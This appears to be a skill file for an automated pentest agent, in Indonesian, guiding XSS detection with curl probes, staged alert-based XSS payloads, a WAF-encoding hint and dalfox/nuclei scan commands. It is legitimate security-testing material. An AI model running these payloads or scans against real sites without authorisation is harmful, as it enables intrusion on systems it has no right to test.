---
name: ujiscan-vuln-xss
description: "Cross-Site Scripting detection — reflected, stored, DOM-based. Use when target reflects input in HTML/JS. Triggers: xss, cross-site scripting, reflected, stored, dom xss."
version: 1.0.0
phase: ["vulnscan"]
category: ["vulnscan"]
tools: ["nuclei", "dalfox", "curl"]
tags: ["vuln", "detection", "verification"]
---

# XSS Detection# XSS Detection

## Konsep Dasar
XSS terjadi saat input user dirender tanpa sanitasi. 3 tipe: Reflected (langsung), Stored (persisten), DOM-based (client-side JS).

## Langkah Pengujian

### 1. Temukan titik refleksi
Cari parameter yang nilainya muncul di response (search, error page, parameter query).

### 2. Probe dasar (non-destruktif)
```bash
# Reflected — uji konteks HTML
curl -s "http://target/search?q=test123" | grep -i "test123"

# Konteks atribut
curl -s 'http://target/search?q="><svg/onload=alert(1)>' | grep -i "svg"

# Konteks script (DOM)
# Periksa JS yang membaca location.search / document.write / innerHTML
```

### 3. Payload bertahap (dari benign ke proof)
1. `test123` → cek refleksi polos
2. `"><b>test</b>` → cek escape pemula
3. `<svg/onload=alert(document.domain)>` → proof of concept
4. Jika WAF aktif: encode (url, html entity, unicode).

### 4. Auto-scan dgn template
```bash
dalfox url "http://target/search?q=1" --silence
nuclei -u "http://target/?q=1" -tags xss -silent
```

## Klasifikasi
- Reflected tanpa WAF notable: MEDIUM (bisa HIGH jika cookie HttpOnly absent)
- Stored (admin terpapar): HIGH
- DOM-based dengan sink berbahaya: MEDIUM-HIGH

## Verifikasi (wajib)
1. Re-run payload 2x (reproducible)
2. Bukti: response snippet mengandung payload dipantulkan di konteks aktif
3. JANGAN simpan cookie/session attacker — cukup bukti rendering

